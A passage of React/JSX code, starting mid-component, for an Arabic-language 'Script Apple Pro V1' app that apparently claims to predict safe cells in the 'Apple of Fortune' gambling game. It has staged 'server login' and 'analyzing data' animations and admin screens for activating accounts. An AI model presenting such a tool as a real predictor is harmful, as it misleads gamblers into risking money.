                   onClick={() => setView("activate")}
                   variant="outline"
                   className="w-full h-14 bg-transparent border-2 border-white/10 hover:bg-white/5 text-white/70 hover:text-white text-lg font-bold rounded-2xl transition-all"
                 >
                   تفعيل حسابك على السيرفر
                 </Button>
               </div>
            </div>
          </motion.div>
        )}

        {view === "server-auth" && (
          <motion.div
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            className="flex flex-col items-center justify-center min-h-[60vh] space-y-12 py-20"
          >
            {/* Apple Icon with Arcs */}
            <div className="relative scale-125">
              <motion.div 
                animate={{ rotate: 360 }}
                transition={{ duration: 3, repeat: Infinity, ease: "linear" }}
                className="absolute inset-[-30px] rounded-full border border-cyan-500/20"
              />
              <motion.div 
                animate={{ rotate: -360 }}
                transition={{ duration: 4, repeat: Infinity, ease: "linear" }}
                className="absolute inset-[-20px] rounded-full border-t-2 border-r-2 border-cyan-400 border-l-transparent border-b-transparent"
              />
              <div className="relative z-10 w-24 h-24 flex items-center justify-center">
                 <motion.div 
                  initial={{ scale: 0.8 }}
                  animate={{ scale: 1 }}
                  transition={{ duration: 0.5, repeat: Infinity, repeatType: "reverse" }}
                  className="w-20 h-20 rounded-full bg-black/40 p-2 flex items-center justify-center shadow-[0_0_30px_rgba(34,211,238,0.4)] border border-cyan-400/30 relative overflow-hidden"
                 >
                    <img src="/input_file_4.png" alt="Apple" className="w-full h-full object-contain drop-shadow-[0_2px_10px_rgba(0,0,0,0.5)]" />
                 </motion.div>
              </div>
            </div>

            <div className="text-center space-y-3">
              <h2 className="text-3xl md:text-4xl font-black text-cyan-400 tracking-tighter drop-shadow-[0_0_10px_rgba(34,211,238,0.3)]">
                Script Apple Pro V1
              </h2>
              <p className="text-base font-bold text-white/40 tracking-wider">
                ID: {accountID} — جاري تسجيل الدخول لسيرفر
              </p>
            </div>

            <div className="w-full max-w-[300px] h-1 bg-white/5 rounded-full overflow-hidden">
               <motion.div 
                initial={{ width: 0 }}
                animate={{ width: `${connectionProgress}%` }}
                className="h-full bg-cyan-400 shadow-[0_0_10px_rgba(34,211,238,0.5)]"
               />
            </div>
          </motion.div>
        )}

        {view === "game" && (
          <motion.div
            initial={{ opacity: 0, scale: 0.95 }}
            animate={{ opacity: 1, scale: 1 }}
            className="w-full space-y-6"
          >
            {/* Game Header */}
            <Card className="bg-[#111726]/80 border-white/5 rounded-3xl p-6 shadow-2xl relative overflow-hidden backdrop-blur-xl">
               <div className="flex items-center justify-between mb-8">
                  <div className="w-12 h-12 bg-blue-500/10 border border-blue-500/20 rounded-2xl flex items-center justify-center text-blue-400 font-black text-sm">
                    V1
                  </div>
                  <h2 className="text-2xl font-black text-[#40C4FF]">Apple of Fortune</h2>
                  <Button
                    size="icon"
                    variant="ghost"
                    onClick={() => setView("login")}
                    className="w-12 h-12 bg-white/5 rounded-2xl text-muted-foreground hover:bg-white/10"
                  >
                    <ChevronDown className="rotate-90 w-6 h-6" />
                  </Button>
               </div>

               <div className="flex items-center justify-center gap-4">
                  <div className="bg-black/30 border border-[#22d3ee]/20 px-6 py-3 rounded-2xl flex items-center gap-3">
                    <User className="w-4 h-4 text-cyan-400" />
                    <span className="text-sm font-bold text-white/80">{accountID} : ID</span>
                  </div>
                  <div className="bg-black/30 border border-[#22d3ee]/20 px-6 py-3 rounded-2xl flex items-center gap-3">
                    <span className="text-sm font-black text-white capitalize">{platform}</span>
                    <span className="text-cyan-400">💎</span>
                  </div>
               </div>
            </Card>

            {/* Game Grid Container */}
            <Card className="bg-[#111726]/80 border-white/5 rounded-3xl p-4 sm:p-6 pb-8 shadow-2xl relative overflow-hidden backdrop-blur-xl">
              <div className="flex flex-col gap-2 sm:gap-3 max-h-[500px] overflow-y-auto pr-2 custom-scrollbar" dir="ltr">
                {[
                  { mult: "x349.68", row: 9 },
                  { mult: "x69.93", row: 8 },
                  { mult: "x27.92", row: 7 },
                  { mult: "x11.18", row: 6 },
                  { mult: "x6.71", row: 5 },
                  { mult: "x4.02", row: 4 },
                  { mult: "x2.41", row: 3 },
                  { mult: "x1.93", row: 2 },
                  { mult: "x1.54", row: 1 },
                  { mult: "x1.23", row: 0 },
                ].map((rowInfo, rIdx) => (
                  <div key={rIdx} className="flex items-center justify-between gap-2 sm:gap-4">
                    <div className="w-16 text-left pl-1 sm:pl-2">
                       <span className="text-[10px] font-mono font-bold text-cyan-400/60">{rowInfo.mult}</span>
                    </div>
                    <div className="grid grid-cols-5 gap-1.5 sm:gap-3 flex-1">
                      {Array.from({ length: 5 }).map((_, cIdx) => (
                        <div key={cIdx} className="relative aspect-square">
                            <motion.div 
                              initial={{ opacity: 0.8, scale: 0.95 }}
                              animate={{ 
                                opacity: 1,
                                scale: 1,
                                borderColor: (hasRevealed && isSafeApple(rowInfo.row, cIdx))
                                  ? "rgba(34, 211, 238, 0.6)" : "rgba(141, 110, 99, 0.1)"
                              }}
                              className="w-full h-full relative flex items-center justify-center"
                           >
                              <AnimatePresence mode="wait">
                                {(hasRevealed && predictions && Object.keys(predictions).length > 0) ? (
                                  isSafeApple(rowInfo.row, cIdx) ? (
                                    <motion.div
                                      key="apple"
                                      initial={{ scale: 0, opacity: 0, rotate: -30 }}
                                      animate={{ scale: 1, opacity: 1, rotate: 0 }}
                                      exit={{ scale: 0, opacity: 0 }}
                                      className="w-full h-full flex items-center justify-center z-10"
                                    >
                                       <motion.div 
                                        animate={{ scale: [1, 1.1, 1], opacity: [0.3, 0.5, 0.3] }}
                                        transition={{ duration: 2, repeat: Infinity }}
                                        className="absolute w-[90%] h-[90%] bg-green-500/30 rounded-full blur-xl" 
                                       />
                                       <div className="w-[85%] h-[85%] rounded-full bg-black/40 p-2 flex items-center justify-center shadow-lg border border-green-500/20 overflow-hidden">
                                          <img src="/input_file_4.png" alt="Good Apple" className="w-full h-full object-contain" />
                                       </div>
                                    </motion.div>
                                  ) : (
                                    <motion.div
                                      key="bad-apple"
                                      initial={{ scale: 0, opacity: 0, rotate: 30 }}
                                      animate={{ scale: 1, opacity: 1, rotate: 0 }}
                                      exit={{ scale: 0, opacity: 0 }}
                                      className="w-full h-full flex items-center justify-center z-10"
                                    >
                                       <motion.div 
                                        animate={{ scale: [1, 1.1, 1], opacity: [0.2, 0.4, 0.2] }}
                                        transition={{ duration: 2, repeat: Infinity }}
                                        className="absolute w-[90%] h-[90%] bg-red-500/20 rounded-full blur-xl" 
                                       />
                                       <div className="w-[85%] h-[85%] rounded-full bg-black/40 p-2 flex items-center justify-center shadow-lg border border-red-500/20 overflow-hidden">
                                          <img src="/input_file_6.png" alt="Bad Apple" className="w-full h-full object-contain" />
                                       </div>
                                    </motion.div>
                                  )
                                ) : (
                                  <motion.div
                                    key="wood"
                                    initial={{ opacity: 0 }}
                                    animate={{ opacity: 1 }}
                                    exit={{ opacity: 0 }}
                                    className="w-full h-full rounded-full bg-[#1b100e] border-2 border-white/5 shadow-md relative overflow-hidden"
                                  >
                                     <img src="/input_file_5.png" alt="Wood block" className="absolute inset-0 w-full h-full object-cover opacity-70" />
                                     <div className="absolute inset-0 bg-black/20" />
                                  </motion.div>
                                )}
                              </AnimatePresence>
                           </motion.div>
                        </div>
                      ))}
                    </div>
                  </div>
                ))}
              </div>

              {/* Analyzing Overlay */}
              <AnimatePresence>
                {isPredicting && (
                  <motion.div
                    initial={{ opacity: 0 }}
                    animate={{ opacity: 1 }}
                    exit={{ opacity: 0 }}
                    className="absolute inset-0 bg-black/70 backdrop-blur-[2px] z-30 flex flex-col items-center justify-center space-y-6 rounded-3xl"
                  >
                    {/* Scanning Line */}
                    <motion.div 
                      animate={{ top: ["0%", "100%", "0%"] }}
                      transition={{ duration: 2.5, repeat: Infinity, ease: "linear" }}
                      className="absolute left-0 w-full h-[2px] bg-cyan-400 shadow-[0_0_25px_rgba(34,211,238,1)] z-40"
                    />
                    
                    <div className="flex flex-col items-center gap-6 relative z-50">
                       <div className="flex gap-3">
                          {[0, 1, 2].map((i) => (
                            <motion.div
                              key={i}
                              animate={{ scale: [1, 1.4, 1], opacity: [0.4, 1, 0.4] }}
                              transition={{ duration: 0.8, repeat: Infinity, delay: i * 0.15 }}
                              className="w-3 h-3 rounded-full bg-cyan-400 shadow-[0_0_10px_rgba(34,211,238,0.5)]"
                            />
                          ))}
                       </div>
                       <p className="text-2xl font-black text-cyan-400 tracking-tighter drop-shadow-lg">جاري تحليل البيانات...</p>
                    </div>
                  </motion.div>
                )}
              </AnimatePresence>
            </Card>

            {/* Action Buttons */}
            <div className="space-y-4">
              <Button 
                onClick={generatePredictions}
                disabled={isPredicting}
                className="w-full h-20 bg-gradient-to-r from-blue-600 to-cyan-500 hover:from-blue-500 hover:to-cyan-400 text-white text-2xl font-black rounded-3xl shadow-[0_10px_30px_rgba(6,182,212,0.3)] active:scale-[0.98] transition-all flex items-center justify-center gap-4 group"
              >
                <span>إظهار التوقع</span>
                <img src="/input_file_4.png" className="w-10 h-10 object-contain transition-transform group-hover:scale-125" alt="Apple" />
              </Button>

              <Button 
                onClick={resetGame}
                className="w-full h-16 bg-[#1c2230] hover:bg-[#252c3d] text-rose-500 border-2 border-rose-500/20 text-xl font-black rounded-3xl transition-all flex items-center justify-center gap-4"
              >
                <span>إعادة تعيين</span>
                <RefreshCcw className="w-6 h-6 rotate-180" />
              </Button>
            </div>
          </motion.div>
        )}
        {view === "reject" && (
          <motion.div
            initial={{ opacity: 0, scale: 0.95 }}
            animate={{ opacity: 1, scale: 1 }}
            className="flex flex-col items-center justify-center min-h-[80vh] px-4"
          >
            <div className="w-full max-w-md bg-[#111726]/80 border border-red-500/30 rounded-[2.5rem] p-10 space-y-8 backdrop-blur-xl shadow-[0_20px_50px_rgba(239,68,68,0.2)] text-center">
              <div className="w-24 h-24 bg-red-500/20 rounded-full flex items-center justify-center mx-auto mb-6">
                <X className="w-12 h-12 text-red-500" />
              </div>
              <h1 className="text-3xl font-black text-white">❌ تم رفض الطلب</h1>
              <p className="text-muted-foreground font-medium">الطلب المرفق بهذا الرابط قد تم رفضه ولن يتم تفعيل هذا الحساب.</p>
              
              <Button 
                onClick={() => window.location.href = '/'}
                className="w-full mt-6 h-14 bg-white/5 hover:bg-white/10 text-white font-bold rounded-2xl"
              >
                العودة للرئيسية
              </Button>
            </div>
          </motion.div>
        )}

        {view === "approve" && (
          <motion.div
            initial={{ opacity: 0, scale: 0.95 }}
            animate={{ opacity: 1, scale: 1 }}
            className="flex flex-col items-center justify-center min-h-[80vh] px-4"
          >
            <div className="w-full max-w-md bg-[#111726]/80 border border-green-500/30 rounded-[2.5rem] p-10 space-y-8 backdrop-blur-xl shadow-[0_20px_50px_rgba(34,197,94,0.2)] text-center">
              
              {approveStatus === "loading" && (
                <div className="space-y-6">
                  <div className="w-24 h-24 rounded-full border-4 border-t-green-500 border-r-transparent border-b-transparent border-l-transparent animate-spin mx-auto" />
                  <h2 className="text-2xl font-bold text-white animate-pulse">جاري تفعيل الحساب...</h2>
                </div>
              )}

              {approveStatus === "success" && (
                <motion.div initial={{ scale: 0 }} animate={{ scale: 1 }} className="space-y-6">
                  <div className="w-24 h-24 bg-green-500/20 rounded-full flex items-center justify-center mx-auto shadow-[0_0_30px_rgba(34,197,94,0.3)]">
                    <CheckCircle2 className="w-14 h-14 text-green-400" />
                  </div>
                  <h1 className="text-3xl font-black text-green-400">{approveMessage}</h1>
                  <p className="text-white/60">يمكن للمستخدم الآن تسجيل الدخول إلى النظام باستخدام هذا الـ ID.</p>
                </motion.div>
              )}

              {approveStatus === "exists" && (
                <motion.div initial={{ opacity: 0, y: 10 }} animate={{ opacity: 1, y: 0 }} className="space-y-6">
                  <div className="w-24 h-24 bg-blue-500/20 rounded-full flex items-center justify-center mx-auto">
                    <AlertCircle className="w-12 h-12 text-blue-400" />
                  </div>
                  <h2 className="text-2xl font-black text-blue-400">{approveMessage}</h2>
                </motion.div>
              )}

              {approveStatus === "error" && (
                <motion.div initial={{ opacity: 0, y: 10 }} animate={{ opacity: 1, y: 0 }} className="space-y-6">
                  <div className="w-24 h-24 bg-red-500/20 rounded-full flex items-center justify-center mx-auto">
                    <X className="w-12 h-12 text-red-500" />
                  </div>
                  <h2 className="text-xl font-black text-red-500">{approveMessage}</h2>
                </motion.div>
              )}

              {(approveStatus !== "loading") && (
                <Button 
                  onClick={() => window.location.href = '/'}
                  className="w-full mt-6 h-14 bg-white/5 hover:bg-white/10 text-white font-bold rounded-2xl"
                >
                  العودة للرئيسية
                </Button>
              )}
            </div>
          </motion.div>
        )}
      </div>
    </div>
  );
}

